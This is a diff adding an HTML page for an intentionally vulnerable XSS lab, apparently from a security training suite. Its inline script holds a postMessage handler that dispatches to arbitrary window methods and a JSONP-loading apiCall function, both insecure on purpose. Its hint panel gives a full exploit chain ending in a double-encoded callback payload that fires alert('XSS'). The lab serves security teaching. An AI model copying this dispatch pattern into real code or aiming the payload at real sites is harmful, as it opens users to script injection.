@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SearchHub - Enterprise Search</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;color:#1a202c}
+    .nav{background:#1a202c;color:#e2e8f0;height:50px;display:flex;align-items:center;padding:0 24px;justify-content:space-between}.nav .brand{font-weight:800;font-size:16px}.nav .brand em{color:#63b3ed;font-style:normal}.nav .links{display:flex;gap:20px;font-size:13px}.nav .links a{color:#a0aec0;text-decoration:none;font-weight:500}.nav .links a:hover{color:#e2e8f0}
+    .hero{background:linear-gradient(135deg,#2b6cb0,#2c5282);padding:60px 24px;text-align:center;color:#fff}.hero h1{font-size:28px;font-weight:800;margin-bottom:8px}.hero p{font-size:14px;opacity:.8;margin-bottom:24px}
+    .search-wrap{max-width:600px;margin:0 auto;display:flex;gap:8px}.search-wrap input{flex:1;padding:12px 18px;border:none;border-radius:10px;font-size:14px;box-shadow:0 4px 12px rgba(0,0,0,.15)}.search-wrap button{padding:12px 24px;background:#ebf8ff;color:#2b6cb0;border:none;border-radius:10px;font-weight:700;cursor:pointer}
+    .container{max-width:900px;margin:0 auto;padding:32px 24px}
+    .results{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:20px;margin-bottom:16px;min-height:100px}
+    .results h3{font-size:14px;font-weight:600;margin-bottom:12px;color:#4a5568}
+    .result-item{padding:10px 0;border-bottom:1px solid #f7fafc;font-size:13px;color:#4a5568}
+    .result-item:last-child{border-bottom:none}
+    .sidebar-info{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:20px;font-size:13px;color:#718096;line-height:1.6}
+    .sidebar-info h3{font-size:14px;font-weight:600;color:#2d3748;margin-bottom:8px}
+    .grid{display:grid;grid-template-columns:1fr 300px;gap:16px}
+    .tag{font-size:10px;padding:2px 8px;border-radius:4px;background:#ebf8ff;color:#2b6cb0;font-weight:600}
+    #log-output{background:#1a202c;color:#a0aec0;padding:14px;border-radius:8px;font-family:'Fira Code',monospace;font-size:11px;margin-top:12px;max-height:200px;overflow-y:auto;white-space:pre-wrap}
+  </style>
+</head>
+<body>
+  <div class="nav">
+    <div class="brand"><em>Search</em>Hub</div>
+    <div class="links"><a href="#">Dashboard</a><a href="#">Settings</a><a href="#">API Docs</a></div>
+  </div>
+
+  <div class="hero">
+    <h1>Enterprise Search</h1>
+    <p>Unified search across your workspace, docs, and data</p>
+    <div class="search-wrap">
+      <input type="text" id="sq" placeholder="Search everything...">
+      <button onclick="APP.search(document.getElementById('sq').value)">Search</button>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="grid">
+      <div>
+        <div class="results" id="search-results">
+          <h3>Results</h3>
+          <div class="result-item" style="color:#a0aec0">Enter a query to search...</div>
+        </div>
+        <div id="log-output">// Message log\n</div>
+      </div>
+      <div class="sidebar-info">
+        <h3>Search Tips</h3>
+        <p>Use quotes for exact phrases. Prefix with <code>type:</code> to filter by content type. Use <code>from:</code> to search by author.</p>
+        <p style="margin-top:12px">This page also accepts search commands via <code>postMessage</code> from approved integrations.</p>
+        <p style="margin-top:12px"><span class="tag">v3.2.1</span></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * SearchHub Application Framework v3.2.1
+     * Internal API + Integration Message Handler
+     */
+    !function(){"use strict";var APP=window.APP={version:"3.2.1",config:{searchEndpoint:"/api/jsonp/search",corsProfile:"/api/chain/profile"},search:function(q){if(!q)return;var el=document.getElementById("search-results");el.innerHTML='<h3>Results</h3><div class="result-item" style="color:#a0aec0">Searching...</div>';fetch(this.config.searchEndpoint+"?q="+encodeURIComponent(q)).then(function(r){return r.json()}).then(function(d){if(!d.results||!d.results.length){el.innerHTML='<h3>Results</h3><div class="result-item">No results for "'+q+'"</div>'}else{var h='<h3>'+d.results.length+' Results</h3>';d.results.forEach(function(r){h+='<div class="result-item">'+r.title+'</div>'});el.innerHTML=h}})},apiCall:function(url){var s=document.createElement("script");s.src=APP.config.searchEndpoint+url;document.head.appendChild(s);APP._log("apiCall: loaded "+url)},_log:function(msg){var el=document.getElementById("log-output");if(el)el.textContent+="["+new Date().toLocaleTimeString()+"] "+msg+"\n"}};APP._log("SearchHub v"+APP.version+" initialized");APP._log("Listening for integration messages...");window.addEventListener("message",function(e){var t=e.data;if("string"==typeof t){try{t=JSON.parse(t)}catch(err){APP._log("Parse error: "+err.message);return}}if(!t||!t.method)return;APP._log("Received: method="+t.method+", arg="+(t.arg||"").substring(0,60));var r=t.method.split(".");if(r[0]!=="APP")return;var n=window;for(var a=0;a<r.length;a++){if(n===undefined){APP._log("Method not found: "+t.method);return}n=n[r[a]]}if(typeof n==="function"){n(t.arg);APP._log("Executed: "+t.method)}else{APP._log("Not a function: "+t.method)}})}();
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Method Dispatch via postMessage</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The page has a postMessage handler that traverses object properties via dot notation and calls the result as a function. Combined with a JSONP endpoint, this becomes XSS. Based on <a href="https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/" style="color:#3b82f6">jub0bs' real-world chain</a>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Find the handler</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Beautify the minified code. The <code>addEventListener('message', ...)</code> handler parses JSON, splits <code>method</code> on <code>"."</code>, then walks the resulting path on <code>window</code>:
+          <pre><code>var r = t.method.split(".");
+var n = window;
+for (var a = 0; a < r.length; a++) {
+  n = n[r[a]];
+}
+n(t.arg); // Calls the resolved function!</code></pre>
+          So <code>method: "APP.apiCall"</code> resolves to <code>window.APP.apiCall</code> and calls it with <code>arg</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>What does apiCall do?</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>APP.apiCall(url)</code> creates a <code>&lt;script&gt;</code> tag with <code>src = searchEndpoint + url</code>. The search endpoint supports JSONP via <code>?output=jsonp&amp;callback=...</code>. You control the callback via the <code>arg</code> parameter.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>The JSONP endpoint</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>/api/jsonp/search</code> accepts <code>callback</code> and <code>output=jsonp</code>. The callback value becomes the function name wrapping the JSON. If you set <code>callback=alert</code>, the response is <code>alert({...})</code>.
+          For actual XSS: use double URL-encoding to get arbitrary JS: <code>callback=alert%2528document.domain%2529%252f%252f</code>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Build the arg string</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>apiCall</code> prepends the search endpoint to your arg. So your arg should look like: <code>&amp;callback=alert%2528document.domain%2529%252f%252f&amp;output=jsonp#</code>. The <code>#</code> at the end cuts off the rest. The full URL becomes the JSONP endpoint with your callback.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p>In this page's DevTools console:</p>
+          <pre>postMessage(JSON.stringify({
+  method: "APP.apiCall",
+  arg: "&callback=alert%2528%2527XSS%2527%2529%252f%252f&output=jsonp#"
+}), '*');</pre>
+          <p>Flow: handler resolves <code>APP.apiCall</code> → creates script tag → script loads JSONP endpoint → callback is double-decoded to <code>alert('XSS')//</code> → wraps the JSON → script executes → alert fires.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('pm-adv-dispatch', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
